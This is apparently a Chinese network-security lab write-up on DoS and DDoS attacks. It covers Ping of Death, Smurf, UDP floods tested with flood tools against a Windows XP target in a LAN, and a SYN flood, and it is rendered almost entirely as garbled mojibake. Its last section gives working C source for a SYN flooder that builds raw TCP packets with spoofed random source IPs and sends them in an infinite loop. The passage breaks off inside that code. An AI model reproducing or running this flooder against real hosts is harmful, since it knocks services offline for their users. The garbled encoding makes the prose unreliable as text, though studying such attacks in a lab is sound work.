å®éªŒå‰æçŸ¥è¯† DoSï¼ˆDenial of Serviceï¼‰æ”»å‡» å‡¡æ˜¯èƒ½å¯¼è‡´åˆæ³•ç”¨æˆ·ä¸èƒ½æ­£å¸¸è®¿é—®ç½‘ç»œæœåŠ¡çš„è¡Œä¸ºéƒ½å¯è§†ä¸ºæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ DDoSï¼ˆDistributed Denial of Serviceï¼‰æ”»å‡» å€ŸåŠ©æ•°ç™¾ã€æ•°åƒè¢«æ¤å…¥æ”»å‡»å®ˆæŠ¤è¿›ç¨‹çš„ä¸»æœºï¼Œå¯¹ç›®æ ‡å±•å¼€çš„â€œé›†å›¢å¼â€æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œé€šå¸¸é’ˆå¯¹é«˜å¸¦å®½ã€é«˜æ€§èƒ½ç½‘ç«™ DDoSæ”»å‡»ç±»å‹ åŸºäºæ“ä½œç³»ç»Ÿ/åº”ç”¨è½¯ä»¶æ¼æ´çš„DDoSæ”»å‡»ï¼›\nåŸºäºåè®®æ¼æ´çš„ç½‘ç»œå±‚DDoSæ”»å‡»ï¼›\nåˆ©ç”¨åè®®æ¼æ´ï¼Œå¯¼è‡´ç›®æ ‡èµ„æºè¢«å¤§å¹…å ç”¨ã€‚æ˜¯æœ€å¸¸è§çš„æ”»å‡»æ–¹å¼ï¼Œä½†éœ€è¦ä¸€å®šè§„æ¨¡çš„å‚€å„¡ä¸»æœºã€‚ é¢å‘ç½‘ç»œèµ„æºçš„DDoSæ”»å‡»ï¼›\næ”»å‡»è€…æ§åˆ¶å‚€å„¡æœºåŒæ—¶å‘é€æ­£å¸¸æŠ¥æ–‡ï¼Œå¯¼è‡´ç›®æ ‡èµ„æºè¢«è€—å°½ã€‚è¿™ç§æ”»å‡»æ–¹å¼æœ€éš¾é˜²èŒƒï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦æ§åˆ¶è¾ƒå¤§è§„æ¨¡çš„ä¸»æœºæˆ–æœåŠ¡å™¨ Ping of Death æ”»å‡»ç‚¹ï¼šæ“ä½œç³»ç»Ÿåè®®æ ˆæ²¡æœ‰å¤„ç†ä¾‹å¤–æƒ…å†µçš„è®¾è®¡ç¼ºé™·ã€‚ åŸç†ï¼šåˆ©ç”¨äº†åè®®å®ç°æ—¶çš„æ¼æ´ï¼ˆCVE-1999-0128ï¼‰ã€‚ICMPåè®®ç”¨äºè¯Šæ–­ç½‘ç»œçŠ¶å†µï¼ˆç«¯ç‚¹æ˜¯å¦å¯è¾¾ç­‰ï¼‰ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒAå‘Bå‘é€ICMP echo requestï¼ŒBæ”¶åˆ°åè¿”å›ICMP echo replyã€‚åˆ™AçŸ¥é“ï¼ŒBåœ¨çº¿ã€å¯è¾¾ã€‚ICMPåŒ…é™¤äº†åŒ…å¤´å¤–ï¼Œè¿˜å¯ä»¥æºå¸¦æ•°æ®ã€‚è¿™äº›æ•°æ®ä¸ç”¨äºè¿›ä¸€æ­¥å¤„ç†ï¼Œä»…è¾…åŠ©è¯Šæ–­ç½‘ç»œçŠ¶å†µï¼ˆæ ¹æ®æ”¶åˆ°å“åº”çš„æ—¶é—´åˆ¤æ–­ç½‘ç»œæ˜¯å¦é€šç•…ï¼‰ã€‚æ”»å‡»è€…åˆ¶é€ è¶…é•¿æ•°æ®åŒ…ï¼Œä½¿å¾—æ•°æ®åŒ…è¶…è¿‡65535å­—èŠ‚ä¸Šé™ã€‚æ²¡æœ‰å¼‚å¸¸å¤„ç†çš„åè®®æ ˆï¼Œæ”¶åˆ°è¿™æ ·çš„æ•°æ®åŒ…ï¼Œå¯èƒ½ä¼šç”±äºç¼“å­˜åŒºæº¢å‡ºè€Œå´©æºƒã€‚ï¼ˆIPæ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦ä¸º65535Bï¼ŒIPé¦–éƒ¨é•¿åº¦ä¸º20Bï¼ŒICMPé¦–éƒ¨ä¸º8å­—èŠ‚ï¼ŒICMPåŒ…æœ€å¤§æ•°æ®é•¿åº¦ä¸ºï¼š65535-20-8=65507B. Smurf ä»¥ç›®æ ‡IPä¸ºæºåœ°å€ï¼Œä»¥å¹¿æ’­åœ°å€ä¸ºç›®åœ°å€ï¼Œå‘é€ICMP Echoè¯·æ±‚ã€‚å¹¿æ’­åœ°å€å¯¹åº”ç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºéƒ½èƒ½æ”¶åˆ°è¯·æ±‚ï¼Œå¹¶å‘ç›®æ ‡å‘é€ICMP Replyï¼Œå¯¼è‡´ç›®æ ‡è¢«å¤§é‡åº”ç­”å æ®èµ„æºã€‚ UdpSmurf åˆ©ç”¨7å·(echo)ç«¯å£ã€‚æ ¹æ®åè®®ï¼Œè‹¥ç«¯å£å¼€æ”¾ï¼Œåˆ™å›é€åº”ç­”UDPæ•°æ®åŒ…ã€‚è‹¥ç«¯å£å…³é—­ï¼Œåˆ™å‘é€ä¸€ä¸ªICMPæŠ¥æ–‡ï¼ˆç›®æ ‡ä¸å¯è¾¾ï¼‰ã€‚ æ”»å‡»è€…ä»¥å¹¿æ’­åœ°å€ä¸ºç›®æ ‡åœ°å€ï¼Œä»¥å—å®³è€…åœ°å€ä¸ºæºåœ°å€ï¼Œä½¿å¾—å¤§é‡åº”ç­”åŒ…é€å¾€å—å®³è€…ã€‚ TCP SYN Floodæ”»å‡» é€šè¿‡è™šå‡çš„æ•°æ®åŒ…ï¼Œé€ æˆç›®æ ‡ä¿å­˜å¤§é‡åŠå¼€TCPè¿æ¥ã€‚ ç®¡ç†TCPè¿æ¥éœ€è¦ç³»ç»Ÿèµ„æºï¼Œç³»ç»Ÿèƒ½å¿å—çš„åŠå¼€è¿æ¥æœ‰ä¸Šé™ã€‚ å½“åŠå¼€è¿æ¥è¾¾åˆ°ä¸€å®šæ•°ç›®æ—¶ï¼Œç³»ç»Ÿå°†ä¸å†æ¥æ”¶æ–°çš„è¿æ¥è¯·æ±‚ã€‚ æ­£å¸¸çš„æœåŠ¡è¯·æ±‚å› æ­¤å¾—ä¸åˆ°å“åº”ã€‚ TCPæ­£å¸¸è¿æ¥è¿‡ç¨‹ Aå‘é€SYNåŒ…åæ­»æœºæˆ–æ‰çº¿ TCPåè®®å¤´\nTCPä¼ªé¦–éƒ¨\nä¼ªé¦–éƒ¨å…±æœ‰ 12 å­—èŠ‚ï¼ŒåŒ…å« IP åè®®å¤´éƒ¨çš„ä¸€äº›å­—æ®µï¼Œæœ‰å¦‚ä¸‹ä¿¡æ¯ï¼š32ä½æºIPåœ°å€ã€32ä½ç›®çš„IPåœ°å€ã€8ä½ä¿ç•™å­—èŠ‚(ç½®0)ã€8ä½ä¼ è¾“å±‚åè®®å·(TCPæ˜¯6ï¼ŒUDPæ˜¯17)ã€16ä½TCPæŠ¥æ–‡é•¿åº¦(TCPé¦–éƒ¨+æ•°æ®)ã€‚ TCP åè®®æ ¡éªŒå’Œè®¡ç®—ä¸‰éƒ¨åˆ†ï¼šTCPä¼ªé¦–éƒ¨ + TCPå¤´éƒ¨ + TCPæ•°æ®ã€‚ IP å¤´éƒ¨\nTCP åè®®é€šè¿‡ä¸€ç§åä¸º ä¸‰æ¬¡æ¡æ‰‹ çš„è¿‡ç¨‹æ¥å»ºç«‹å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è¿æ¥ï¼Œä¸‰æ¬¡æ¡æ‰‹ è¿‡ç¨‹çš„åŸç†å¦‚å›¾\nå»ºç«‹è¿æ¥ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹å¦‚ä¸‹ï¼š\nå®¢æˆ·ç«¯éœ€è¦å‘é€ä¸€ä¸ª SYNåŒ… ç»™æœåŠ¡ç«¯ï¼ˆåŒ…å«äº†å®¢æˆ·ç«¯åˆå§‹åŒ–åºåˆ—å·ï¼‰ï¼Œå¹¶ä¸”å°†è¿æ¥çš„çŠ¶æ€è®¾ç½®ä¸º SYN_SENTï¼Œè¿™ä¸ªè¿‡ç¨‹ç”± connect() ç³»ç»Ÿè°ƒç”¨å®Œæˆã€‚\næœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ SYNåŒ… åï¼Œå›å¤ä¸€ä¸ª SYN+ACKåŒ… ç»™å®¢æˆ·ç«¯ï¼ˆåŒ…å«äº†æœåŠ¡ç«¯åˆå§‹åŒ–åºåˆ—å·ï¼‰ï¼Œå¹¶ä¸”è®¾ç½®è¿æ¥çš„çŠ¶æ€ä¸º SYN_RCVDã€‚\nå®¢æˆ·ç«¯æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€è¿‡æ¥çš„ SYN+ACKåŒ… åï¼Œè®¾ç½®è¿æ¥çŠ¶æ€ä¸º ESTABLISHEDï¼ˆè¡¨ç¤ºè¿æ¥å·²ç»å»ºç«‹ï¼‰ï¼Œå¹¶ä¸”å›å¤ä¸€ä¸ª ACKåŒ… ç»™æœåŠ¡ç«¯ã€‚\næœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ ACKåŒ… åï¼Œå°†è¿æ¥çŠ¶æ€è®¾ç½®ä¸º ESTABLISHEDï¼ˆè¡¨ç¤ºè¿æ¥å·²ç»å»ºç«‹ï¼‰ã€‚\nå½“ ä¸‰æ¬¡æ¡æ‰‹ è¿‡ç¨‹å®Œæˆåï¼Œä¸€ä¸ª TCP è¿æ¥å°±æ­¤å»ºç«‹å®Œæˆã€‚\nSYN-floodæ”»å‡»å¤§æ¦‚æœ‰ä»¥ä¸‹ä¸‰ç§æ”»å‡»æ–¹å¼ï¼š\nDirect Attack æ”»å‡»æ–¹ä½¿ç”¨å›ºå®šçš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•å¯¹æ”»å‡»æ–¹çš„æ¶ˆè€—æœ€å°ã€‚ Spoofing(æ¬ºéª—) Attack æ”»å‡»æ–¹ä½¿ç”¨å˜åŒ–çš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•éœ€è¦æ”»å‡»æ–¹ä¸åœåœ°ä¿®æ”¹æºåœ°å€ï¼Œå®é™…ä¸Šæ¶ˆè€—ä¹Ÿä¸å¤§ã€‚ Distributed Direct Attack è¿™ç§æ”»å‡»ä¸»è¦æ˜¯ä½¿ç”¨åƒµå°¸ç½‘ç»œè¿›è¡Œå›ºå®šæºåœ°å€çš„æ”»å‡» 0x03 å®éªŒç¯å¢ƒ éƒ¨ç½²äºåŒä¸€å±€åŸŸç½‘ä¸‹ æ”»å‡»æœº ç½‘ç»œå®‰å…¨å®éªŒ Windows xp IP:192.168.195.131 MAC :00-0C-29-06-65-C9 é¶æœº æ±‡ç¼– Windows xp IP:192.168.195.135 MAC : 00-0c-29-19-ba-6e ç¨‹åºè¿è¡Œæœºå™¨ Ubuntu 16 ç½‘å…³ IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 å·¥å…·ï¼š udp-Flood é˜¿æ‹‰ä¸ visual studio code wireshark 0x04 å·¥å…·åˆ†æ udp_Flood é¦–å…ˆçœ‹ä¸€ä¸‹é¶æœºIP:192.168.195.135å¼€æ”¾çš„ç«¯å£\nå‘ç°TCPä¸­21ã€22ã€80ç«¯å£å‡å¼€å¯ï¼ŒUDPå¼€å¯445,500ç«¯å£ é¦–å…ˆåœ¨æ”»å‡»æœºæ‰“å¼€udp_floodå·¥å…·ï¼Œå¯¹80ç«¯å£è¿›è¡Œæ”»å‡»ã€‚\næ¯ç§’å‘11ä¸ªåŒ… ç„¶ååœ¨é¶æœºä¸­æ‰“å¼€Wiresharkè¿›è¡ŒæŠ“åŒ…\nå®¹æ˜“å‘ç°ï¼Œæ”»å‡»æœºå‘é¶æœºæ¯å‘ä¸€ä¸ªUDPåŒ…ï¼Œé¶æœºå°±ä¼šå›åº”ä¸€ä¸ªICMPåŒ…\nä¸éš¾å‘ç°ï¼ŒudpåŒ…çš„æ•°æ®æµéƒ½æ²¡æœ‰é—®é¢˜ï¼Œæ‰€æœ‰udpåŒ…çš„å¤§å°ç›¸åŒï¼Œåè®®ç›¸åŒï¼ŒçŸ­æ—¶é—´å‘é€å¤§é‡çš„åŒ…\nä½†æ˜¯æœåŠ¡å™¨å›æ˜¾ICMPæ˜¾ç¤ºPort Unreachable\nè¿™æ˜¯å› ä¸ºæœåŠ¡å™¨å“åº”å‘é€åˆ°å…¶ä¸­ä¸€ä¸ªç«¯å£çš„UDPæ•°æ®åŒ…æ‰€é‡‡å–çš„æ­¥éª¤ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå½“æœåŠ¡å™¨åœ¨ç‰¹å®šç«¯å£æ¥æ”¶åˆ°UDPæ•°æ®åŒ…æ—¶ï¼Œä¼šç»è¿‡ä¸¤ä¸ªæ­¥éª¤ï¼š\næœåŠ¡å™¨é¦–å…ˆæ£€æŸ¥æ˜¯å¦æ­£åœ¨è¿è¡Œæ­£åœ¨ä¾¦å¬æŒ‡å®šç«¯å£çš„è¯·æ±‚çš„ç¨‹åºã€‚ å¦‚æœæ²¡æœ‰ç¨‹åºåœ¨è¯¥ç«¯å£æ¥æ”¶æ•°æ®åŒ…ï¼Œåˆ™æœåŠ¡å™¨ä½¿ç”¨ICMPï¼ˆpingï¼‰æ•°æ®åŒ…è¿›è¡Œå“åº”ï¼Œä»¥é€šçŸ¥å‘é€æ–¹ç›®çš„åœ°ä¸å¯è¾¾ã€‚ 80ç«¯å£å¹¶æ²¡æœ‰UDPè¿›è¡Œç›‘å¬ï¼Œå› æ­¤æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªICMPåŒ…ï¼Œå‘Šè¯‰å‘é€æ–¹ä¸å¯åˆ°è¾¾ã€‚\nè¿™é‡Œåˆ©ç”¨UDPå¼€å§‹ç›‘å¬çš„445ç«¯å£è¿›è¡Œå®éªŒ\nudpå‘é€çš„åŒ…åŒæ ·æ²¡æœ‰é—®é¢˜ï¼Œå¤§å°ç›¸åŒï¼Œå‡ä¸º83ã€‚ è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹udp_floodæ”»å‡»ä¹‹å‰çš„æ—¶é—´\nç„¶åæ‰“å¼€udp_floodï¼Œæ”»å‡»80ç«¯å£ å¯ä»¥çœ‹åˆ°é˜¿æ‹‰ä¸udp_floodæ”»å‡»ä¹‹åï¼Œè®¿é—®ç™¾åº¦ä¼šä¸¢åŒ…ï¼Œç„¶åå¹³å‡æ—¶é—´ä¹Ÿå¢åŠ äº† å› æ­¤ï¼Œudp_floodä¸€å®šç¨‹åº¦ä¸Šä¼šé˜»ç¢æœåŠ¡å™¨çš„è®¿é—®é€Ÿåº¦ã€‚ å› æ­¤ï¼Œåœ¨udp_floodæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯å‘é€å¤§é‡ä¼ªé€ æºIPåœ°å€çš„å°udpåŒ…ã€‚ç”±äºUDPåè®®æ˜¯æ— è¿æ¥æ€§çš„ï¼Œæ‰€ä»¥åªè¦å¼€äº†ä¸€ä¸ªUDPçš„ç«¯å£æä¾›ç›¸å…³æœåŠ¡çš„è¯ï¼Œé‚£ä¹ˆå°±å¯é’ˆå¯¹ç›¸å…³çš„æœåŠ¡è¿›è¡Œæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ¶ˆè€—çš„æ˜¯æ”»å‡»è€…ä¸é¶æœºæ–¹ä¸¤æ–¹èµ„æºçš„æ¯”æ‹¼ã€‚\né˜¿æ‹‰ä¸ é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœºå¼€æ”¾çš„ç«¯å£ åœ¨æ”»å‡»æœºä¸­æ‰“å¼€é˜¿æ‹‰ä¸udpæ´ªæ°´æ”»å‡»å™¨ é¦–å…ˆå·¥å…·é¶æœºçš„80ç«¯å£ ä¾¿äºæµ‹è¯•ï¼Œè¿™é‡Œè¿›è¡Œä¸€èˆ¬udpæ”»å‡» åœ¨é¶æœºä¸­è·Ÿæ®Wiresharkè¿›è¡ŒæŠ“åŒ… åˆ†æä¸€ä¸‹udpæ•°æ®åŒ… å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°udpæ•°æ®åŒ…çš„æºIPã€MACå’Œç›®çš„IPã€MACéƒ½æ˜¯æ­£ç¡®çš„ï¼Œå”¯ä¸€å¼‚å¸¸çš„æ˜¯udpä¼ é€çš„æ•°æ®åŒ…Dataçš„æ•°æ®è¿‡é•¿ï¼Œä¸º3000byte, åŒæ—¶udpå› ä¸ºè¶…è¿‡1500ä¼šåˆ†ç‰‡ä¼ è¾“ï¼Œå¤§å¤§æé«˜äº†æ”»å‡»çš„æ•ˆç‡ã€‚ å°†ç«¯å£æ”¹ä¸º445 åˆ†æä¸€ä¸‹udpçš„ç»“æ„ å‘ç°ä¹Ÿå®Œå…¨ç¬¦åˆé¢„æœŸï¼Œå’Œudp_floodç›¸æ¯”ï¼Œåªæ˜¯åŒ…çš„å¤§å°å˜å¤§äº†ï¼ŒDDOSçš„å¨åŠ›ä¹Ÿæ›´å¼ºå¤§äº†ã€‚ è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹å·¥å…·å‰ ping www.baidu.comçš„æ—¶å»¶ æ”»å‡»é¶æœºçš„80ç«¯å£ å¾ˆæ˜æ˜¾çœ‹åˆ°æ”»å‡»åçš„udpæ”»å‡»ä½¿å¾—æœåŠ¡å™¨çš„æœ€é«˜æ—¶å»¶å¢åŠ ã€‚ å› æ­¤ï¼Œudp_floodä¸€å®šç¨‹åº¦ä¸Šä¼šé˜»ç¢æœåŠ¡å™¨çš„è®¿é—®é€Ÿåº¦ã€‚ ç”±æ­¤å¯ä»¥çŸ¥é“ï¼Œudp_floodå·¥å…·å’Œé˜¿æ‹‰ä¸çš„åŸç†ç›¸åŒï¼Œéƒ½æ˜¯åˆ©ç”¨UDPæ´ªæ°´æ”»å‡»ï¼Œå¤§æ‰¹é‡çš„æ¶ˆè€—èµ„æºæ¥è¿›è¡ŒDDOSæ”»å‡»ã€‚ æ”»å‡»æ•ˆæœçš„è¯ï¼Œå¦‚æœå¸¦å®½ã€æµé‡è¶³å¤Ÿå¤§çš„è¯ï¼ŒæœåŠ¡å™¨çš„ä¼šä¸æ–­çš„æ¥å—åŒ…ã€ç„¶åç˜«ç—ªã€æ— æ³•æ­£å¸¸ä¸Šç½‘ã€‚ 0x05 SYN-Flood ç¼–ç¨‹å®ç° è¿™é‡Œç”¨å¥—æ¥å­—socketçš„æ–¹æ³•æ¥å®ç°syn-floodæ”»å‡»\nåªéœ€è¦æ„é€ å¥½ä¸€ä¸ªTCPåŒ…ï¼ŒæŒ‡å®šå¥½åŒ…ä¸­IP.flags=0x02(ä¸ºSYNåŒ…)ã€‚\næˆ‘ä»¬è¿™é‡Œåœ¨ubuntu 16 çš„ç¯å¢ƒä¸­ç¼–è¯‘æˆ‘ä»¬å†™å¥½çš„ç¨‹åº\né¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœº(IP : 192.168.195.135)çš„å¼€æ”¾ç«¯å£\nå‘ç°å¼€å¯äº†21ã€22ã€80ç«¯å£ åœ¨ç¨‹åºä¸­ï¼Œå¯¹192.168.195.135çš„80ç«¯å£è¿›è¡Œæ”»å‡»\nå› ä¸ºç¨‹åºæ˜¯æ— é™å¾ªç¯å‘é€ï¼Œéœ€è¦æ‰‹åŠ¨ç»ˆæ­¢ ä¸æ­¤åŒæ—¶ï¼Œåˆ©ç”¨Wiresharkåœ¨é¶æœºè¿›è¡ŒæŠ“åŒ…\nå¯ä»¥çœ‹åˆ°ç¨‹åºéšæœºäº§ç”Ÿå¤§é‡çš„è™šå‡åœ°å€å’Œè™šå‡çš„ç«¯å£å¯¹é¶æœºçš„80ç«¯å£è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºåœ°å€å’Œç«¯å£éƒ½ä¸ºè™šå‡çš„ï¼Œæ‰€ä»¥å¤§é‡çš„tcpè¿æ¥é¶æœºæ— æ³•å¯¹å…¶ackå›å¤ã€‚ äº§ç”Ÿå¤§é‡çš„synåŠè¿æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨è½½è·è¿‡å¤§ï¼Œä»è€Œå´©æºƒã€‚\næŸ¥çœ‹æ­¤æ—¶çš„synçŠ¶æ€ã€‚ å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ï¼Œç¨‹åºäº§ç”Ÿäº†å¤§é‡çš„synåŠè¿æ¥ï¼Œæ¥è‡ªä¸åŒçš„è™šå‡ipåœ°å€å’Œç«¯å£ æŸ¥çœ‹æ”»å‡»å‰ ping www.baidu.com çš„æ•ˆæœ\næ”»å‡»å…¶21ç«¯å£ å‘ç°ping www.baidu.com å·²ç»ä¸èƒ½Pingé€š åŒæ—¶å¾ˆæ˜æ˜¾çš„æ„Ÿå—åˆ°Windows xpå› ä¸ºå—åˆ°SYNæ”»å‡»ï¼Œå› æ­¤è¿è¡Œä¸æµç•…ï¼Œå¡é¡¿ç›¸å½“ä¸¥é‡ã€‚\nå®é™…ä¸Šï¼ŒSYN-floodæ”»å‡»å°±æ˜¯ æ„é€ å¤§é‡çš„SYNåŒ…ã€é‡Œé¢å¡«å……è™šå‡çš„IPã€MACåœ°å€ï¼Œæ¥é€ æˆæœåŠ¡å™¨äº§ç”Ÿå¤§é‡çš„åŠè¿æ¥ï¼Œä»è€Œé€ æˆæœåŠ¡å™¨è¿è¡Œç˜«ç—ªã€‚\nå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip æŠ¥å¤´ struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; // tcp æŠ¥å¤´ struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; //TCPçš„ä¼ªæŠ¥å¤´ï¼Œåœ¨è®¡ç®—TCPçš„æ ¡éªŒå’Œæ—¶éœ€è¦åŒ…å« struct pseudohdr { unsigned int saddr; //æºç›®çš„IP unsigned int daddr; // ç›®çš„IP char zeros; // 8ä½ä¿ç•™å­—ç¬¦ ä¸€èˆ¬ç½®0 char protocol;// åè®® unsigned short length; // é•¿åº¦ }; // è¿™ä¸ªæ˜¯è®¡ç®—æ ¡éªŒå’Œçš„å‡½æ•° unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // é€šè¿‡ä¼ å…¥çš„æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€åˆå§‹åŒ– IP å¤´éƒ¨ç»“æ„ã€‚ void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } // åˆå§‹åŒ– tcp åŒ… void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 ä»£è¡¨ æ˜¯syn åŒ…ï¼Œtcpä¸‰æ¬¡è¿æ¥è¯·æ±‚çš„å¼€å§‹ tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // åˆå§‹åŒ– tcp ä¼ªæŠ¥å¤´ void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // é€šè¿‡ ç›®æ ‡IPåœ°å€ å’Œ ç›®æ ‡ç«¯å£ ç”Ÿæˆä¸€ä¸ª SYNåŒ…ï¼Œä¿å­˜åˆ°å‚æ•° packet ä¸­ï¼Œå¹¶ä¸”è¿”å›åŒ…çš„å¤§å°ã€‚ int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // åˆ›é€ åŸå§‹å¥—æ¥å­— int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* åœ¨è°ƒç”¨ socket() å‡½æ•°åˆ›å»ºå¥—æ¥å­—æ—¶ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º 